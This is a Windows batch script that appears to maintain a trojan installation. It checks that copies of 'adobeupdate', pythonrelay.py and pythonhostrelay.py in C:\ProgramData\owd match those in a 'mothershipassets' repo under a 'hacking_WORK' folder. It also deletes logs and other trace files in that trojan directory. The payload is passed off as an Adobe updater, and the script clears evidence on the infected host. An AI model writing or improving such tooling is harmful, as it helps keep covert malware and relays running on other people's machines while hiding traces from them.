FOR /F "tokens=1,2" %%A IN ('wmic logicaldisk get name^,volumename 2^>nul ^| findstr /I /C:"MAIN"') DO SET "DRIVE_LETTER=%%A"

set mothershipdir=%DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets
set trojandir=C:\ProgramData\owd
cd /d %trojandir%

del /f /q debug_test_*
del /f /q *.log
del /f /q *_running
del /f /q tpl_launch_*
del /f /q tpl_launch.cmd_wmic_process_*
del /f /q *.json
del /f /q *.xml
del /f /q download_*

set adobeupdate=%trojandir%\adobeupdate
set madobeupdate=%mothershipdir%\adobeupdate
set pythonrelay=%trojandir%\pythonrelay.py
set mpythonrelay=%mothershipdir%\pythonrelay.py
set pythonhostrelay=%trojandir%\pythonhostrelay.py
set mpythonhostrelay=%mothershipdir%\pythonhostrelay.py

certutil -hashfile %trojandir%\adobeupdate MD5 | find /v ":" > %trojandir%\adobeupdate.MD5
certutil -hashfile %mothershipdir%\adobeupdate MD5 | find /v ":" > %temp%\adobeupdate.MD5
certutil -hashfile %trojandir%\pythonrelay.py MD5 | find /v ":" > %trojandir%\pythonrelay.py.MD5
certutil -hashfile %mothershipdir%\pythonrelay.py MD5 | find /v ":" > %temp%\pythonrelay.py.MD5
certutil -hashfile %trojandir%\pythonhostrelay.py MD5 | find /v ":" > %trojandir%\pythonhostrelay.py.MD5
certutil -hashfile %mothershipdir%\pythonhostrelay.py MD5 | find /v ":" > %temp%\pythonhostrelay.py.MD5

set /p adobeupdateMD5=<%trojandir%\adobeupdate.MD5
set /p pythonrelayMD5=<%trojandir%\pythonrelay.py.MD5
set /p pythonhostrelayMD5=<%trojandir%\pythonhostrelay.py.MD5

set /p madobeupdateMD5=<%temp%\adobeupdate.MD5
set /p mpythonrelayMD5=<%temp%\pythonrelay.py.MD5
set /p mpythonhostrelayMD5=<%temp%\pythonhostrelay.py.MD5

@echo off

set check=OK
IF NOT "%madobeupdateMD5%"=="%adobeupdateMD5%" (
    set check=ERROR
)
for %%i in ("%madobeupdate%") do set "madobeupdatedt=%%~ti"
for %%i in ("%adobeupdate%") do set "adobeupdatedt=%%~ti"

echo adobeupdateMD5 repo %madobeupdateMD5% %madobeupdatedt% -- owd %adobeupdateMD5% %adobeupdatedt% %check%

set check=OK
IF NOT "%pythonrelayMD5%"=="%mpythonrelayMD5%" (
    set check=ERROR
)
for %%i in ("%mpythonrelay%") do set "mpythonrelaydt=%%~ti"
for %%i in ("%pythonrelay%") do set "pythonrelaydt=%%~ti"

echo pythonrelayMD5 repo %mpythonrelayMD5% %mpythonrelaydt% -- owd %pythonrelayMD5% %pythonrelaydt% %check%

set check=OK
IF NOT "%pythonhostrelayMD5%"=="%mpythonhostrelayMD5%" (
    set check=ERROR
)
for %%i in ("%mpythonhostrelay%") do set "mpythonhostrelaydt=%%~ti"
for %%i in ("%pythonhostrelay%") do set "pythonhostrelaydt=%%~ti"

echo pythonhostrelayMD5 repo  %mpythonhostrelayMD5% %mpythonrelaydt% -- owd %pythonhostrelayMD5% %pythonrelaydt% %check%
